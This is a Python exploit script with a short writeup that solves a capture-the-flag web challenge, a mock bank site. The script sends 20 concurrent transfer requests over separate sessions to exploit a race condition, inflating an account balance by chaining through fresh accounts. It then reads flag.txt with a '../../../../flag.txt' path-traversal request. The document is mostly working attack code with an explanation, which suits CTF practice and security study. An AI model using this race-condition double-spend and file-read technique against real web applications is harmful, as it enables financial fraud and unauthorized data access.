import requests
import threading
import random

url = "https://brew-bank.chals.eycc.2hwa.xyz"

u1 = "A1a!" + str(random.randint(10000, 99999))
requests.post(url + "/register.php", data={"email": u1+"@a.com", "username": u1, "password": "Password123!"})

s1 = requests.Session()
s1.post(url + "/login.php", data={"email": u1+"@a.com", "password": "Password123!"})

for i in range(50):
    r = s1.get(url + "/dashboard.php")
    bal = int(r.text.split('<span class="currency">$</span>')[1].split('</div>')[0].strip().replace(',', ''))
    print("Balance:", bal)

    if bal >= 1000000:
        print("Got VIP")
        break

    u2 = "A1a!" + str(random.randint(10000, 99999))
    requests.post(url + "/register.php", data={"email": u2+"@a.com", "username": u2, "password": "Password123!"})

    sessions = []
    for _ in range(20):
        tmp = requests.Session()
        tmp.post(url + "/login.php", data={"email": u1+"@a.com", "password": "Password123!"})
        sessions.append(tmp)

    threads = []
    for sess in sessions:
        t = threading.Thread(target=sess.post, args=(url + "/transfer.php",), kwargs={"data": {"recipient": u2, "amount": bal}})
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    u1 = u2
    s1 = requests.Session()
    s1.post(url + "/login.php", data={"email": u1+"@a.com", "password": "Password123!"})

r = s1.get(url + "/recipe.php?recipe=../../../../flag.txt")
for line in r.text.split('\n'):
    if "EYCC{" in line:
        print(line.strip())


"""
Fast writeup

This is unattended solve that made author change the revenge challenge

First there are 2 bugs

one in transfer.php
the idea there is no lock on the db raw so if i send 20 requests sending 1$ from account A to account B the server will check if account A has 1$ and all the 20 request do same thing in same time so it pass then when it write to the db
it will increment account B balance by 1$ 20 times so account B has 20$ while account A has -20$

second bug is LFI in recipe.php

after i get VIP balance (1M) i can read /flag.txt via path traversal
but there are 2 tricks to make the exploit actually work

first is php session locking
php locks the session file so if you spam 20 requests with the same cookie they just run sequentially to bypass this i just created 20 different sessions logged into the same sender account and fired them all at once

second is the dept problem aka account burning
if A sends to B A goes into massive negative dept -950$ if i try to send the money from B back to A the money just fills A's dept and i lose the multiplier so A is burned forever i needed a chain of fresh accounts to keep the money growing

so exploit simply
register account A and B
create 20 separate sessions for A
spam 20 concurrent transfers from A to B sending current balance
B gets 20x balance and A goes into massive dept so it is burned
register fresh account C
create 20 separate sessions for B spam transfer to C
keep rotating to fresh accounts A -> B -> C -> D -> E
balance grows exponentially
hit 1M in a 6 iterations and get VIP
read flag with recipe.php?recipe=../../../../flag.txt
"""
